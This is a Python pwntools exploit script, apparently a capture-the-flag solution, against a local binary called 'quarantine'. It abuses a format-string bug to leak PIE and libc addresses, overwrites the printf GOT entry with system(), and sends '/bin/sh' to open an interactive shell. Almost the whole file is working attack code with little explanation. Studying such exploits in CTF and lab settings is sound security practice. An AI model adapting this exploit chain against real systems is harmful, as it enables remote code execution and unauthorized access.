from pwn import *

log.info("Iniciando el hackeo.")

remoteflag = 1
IP = 'localhost'
PORT = 7889
FILENAME = "./quarantine"
if remoteflag:
    io = remote(IP, PORT)
else:
    io = process(FILENAME)

elf = context.binary = ELF(FILENAME)

payload = ''

def till_fmt(payload, io):
    io.sendline("name")
    log.info(io.recvuntil(": "))
    io.sendline("Action")
    log.info(io.recvuntil(": "))
    io.sendline("Add")
    log.info(io.recvuntil(": "))
    io.sendline(payload)
    log.info(io.recvuntil(": "))
    io.sendline("Add")
    log.info(io.recvuntil(": "))
    io.sendline(payload)

def exec_fmt(payload):
    if remoteflag:
        io = remote(IP, PORT)
    else:
        io = process(FILENAME)

    if not remoteflag:
        pass#gdb.attach(io)
    till_fmt(payload, io)
    return io.recvuntil(" already", drop=True)

context.clear(arch = 'i386')
FmtStr(exec_fmt) # find format string offset (34)


log.info(io.recvuntil(": "))
io.sendline("name")
log.info(io.recvuntil(": "))
def leak(payload):
    io.sendline("Action")
    log.info(io.recvuntil(": "))
    io.sendline("Add")
    log.info(io.recvuntil(": "))
    io.sendline(payload)
    log.info(io.recvuntil(": "))
    io.sendline("Add")
    log.info(io.recvuntil(": "))
    io.sendline(payload)
    leaked = io.recvuntil(" already", drop=True)
    log.info(io.recvuntil(": "))
    io.sendline("asdf")
    log.info(io.recvuntil(": "))
    return leaked


if not remoteflag:
    gdb.attach(io)

payload = "%40$p"  #pie leak (base + 0x108c)
log.warn("payload is ")
log.hexdump(payload)

pie_leak = int(leak(payload), 16)
log.info("pie leak:")
log.hexdump(pie_leak)
pie_base = pie_leak - 0x107c
log.warn("calculated printf@got (not libc address): ")
printf_got = pie_base + elf.got.printf
log.hexdump(printf_got)

payload = pack(printf_got)+b"%34$s"
log.info("try to leak libc by reading at printf@got")
#it doesn't matter which libc function we leak
#it's only to calculate the libc address of system
log.info("payload:")
log.info(payload)
got_leak = leak(payload)
log.info("leaked: ")
log.hexdump(got_leak)
printf_got_leak = unpack(got_leak[5:9]) # 1st byte is \n, next 4 bytes are pack(printf_plt), followed by leaked got entries

#libc = ELF('/lib/i386-linux-gnu/libc-2.27.so')
libc = ELF('libc6-i386_2.27-3ubuntu1_amd64.so')
base = printf_got_leak - libc.sym.printf

sys = base + libc.sym.system
binsh = base + next(libc.search(b'/bin/sh\x00'))

log.warn("calculated sys: ")
log.hexdump(sys)
log.warn("calculated binsh: ")
log.hexdump(binsh)


VAL_TO_WRITE = sys
ADDR = printf_got
payload = fmtstr_payload(34,#FmtStr(exec_fmt)
                                {ADDR: VAL_TO_WRITE}, 
                                numbwritten=0, 
                                write_size='short')
log.info("payload for overwriting printf GOT entry with system():")
log.hexdump(payload)
leak(payload)
io.sendline("Action")
io.sendline("Add")
io.sendline("/bin/sh")
io.sendline("Add")
io.sendline("/bin/sh")
 

io.interactive()
